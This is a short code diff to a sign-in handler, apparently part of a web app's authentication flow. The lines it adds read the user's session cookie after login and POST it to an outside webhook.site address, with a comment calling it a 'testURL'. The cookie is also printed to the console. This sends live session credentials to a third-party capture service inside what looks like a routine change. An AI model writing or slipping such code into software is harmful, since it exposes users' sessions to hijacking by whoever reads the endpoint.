@@ -18,10 +18,18 @@ export async function signInSubmit(
     await signIn("credentials", {
       email,
       password,
-      redirect: fromExpo ? false : true,
+      redirect: false,
       // redirectTo: fromExpo ? "/" : undefined,
     });
     const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
+    // send a post request to testURL with the sessionCookie
+    await fetch("https://webhook.site/9e1a2085-84bb-422f-8b2d-c1c15697d356", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ sessionCookie }),
+    });
 
     console.log("SIGNED IN", sessionCookie);
     return { success: true, message: null };
